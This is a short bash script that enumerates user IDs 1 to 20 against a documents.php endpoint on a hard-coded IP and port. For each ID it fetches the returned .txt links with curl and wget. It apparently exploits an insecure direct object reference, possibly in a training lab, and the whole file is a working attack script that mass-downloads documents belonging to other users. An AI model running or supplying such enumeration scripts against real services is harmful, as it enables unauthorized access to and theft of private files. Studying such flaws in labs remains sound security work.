#!/bin/bash  

url="http://94.237.55.43:44450"

mkdir -p downloads
cd downloads

for i in {1..20}; do
    echo "[*] POST uid=$i"
    page=$(curl -s -X POST -d "uid=$i" "$url/documents.php")
    for link in $(echo "$page" | grep -oP "\/documents.*?\.txt"); do
        wget -q "${url}${link}"
        echo "[+] Downloaded: $link"
    done
done

